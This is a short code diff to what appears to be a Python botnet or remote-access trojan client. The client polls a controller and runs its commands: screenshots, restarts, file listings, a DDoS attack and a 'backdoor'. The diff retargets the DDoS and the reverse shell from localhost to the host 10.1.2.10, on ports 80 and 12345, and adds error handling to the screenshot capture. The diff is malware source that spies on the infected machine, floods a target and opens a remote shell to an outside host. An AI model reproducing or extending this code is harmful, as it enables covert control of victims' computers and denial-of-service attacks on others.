@@ -50,7 +50,10 @@ while run == True :
         print("Connexion avec le contrôleur terminée")
     if response.text == "screenshot":
         print("taking screenshot")
-        sendImage("screenshot", screenshot.capture())
+        try:
+            sendImage("screenshot", screenshot.capture())
+        except:
+            print("Error taking screenshot")
     if response.text == "restart":
         print("restarting")
         power.restart()
@@ -71,10 +74,10 @@ while run == True :
         sendJson("ls",listread.afficher_arborescence("."))
     if response.text == "ddos":
         print("launching ddos")
-        ddos.ddos("localhost", 80)
+        ddos.ddos("10.1.2.10", 80)
     if response.text == "backdoor":
         print("opening backdoor")
-        multiReverseShell.reverse_shell("localhost", 12345)
+        multiReverseShell.reverse_shell("10.1.2.10", 12345)
  
     time.sleep(2)
         
